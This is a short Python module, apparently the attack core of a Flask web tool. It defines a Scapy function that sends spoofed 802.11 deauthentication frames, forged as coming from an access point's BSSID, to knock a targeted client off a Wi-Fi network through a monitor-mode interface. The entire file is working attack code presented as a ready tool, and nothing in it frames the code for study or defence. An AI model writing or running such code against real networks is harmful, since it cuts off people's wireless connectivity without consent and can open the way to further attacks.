"""
Core Deauthentication Attack Logic
----------------------------------

This module contains the function to perform a deauthentication attack
using Scapy. It is independent of the Flask web interface.
"""

from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
import time

def deauth_attack(target_mac, bssid, interface, packets=100, interval=0.1):
    """
    Performs a deauthentication attack against a target client.

    Args:
        target_mac (str): The MAC address of the client to deauthenticate.
        bssid (str): The MAC address of the access point.
        interface (str): The wireless interface to use for the attack (must be in monitor mode).
        packets (int): The number of deauthentication packets to send.
        interval (float): The time interval in seconds between sending packets.
    """
    print(f"Starting deauth attack on {target_mac} from AP {bssid} via {interface}")
    
    # Construct the deauthentication packet.
    # The target_mac is the destination (addr1), and the BSSID is the source (addr2).
    # addr3 is also the BSSID.
    packet = RadioTap() / Dot11(type=0, subtype=12, addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    
    # Send the packets in a loop.
    for i in range(packets):
        try:
            sendp(packet, iface=interface, count=1, inter=interval, verbose=0)
            print(f"Sent deauth packet {i+1}/{packets} to {target_mac}")
        except Exception as e:
            print(f"Error sending deauth packet: {e}")
            break
        time.sleep(interval)
        
    print(f"Deauth attack finished for {target_mac}.")
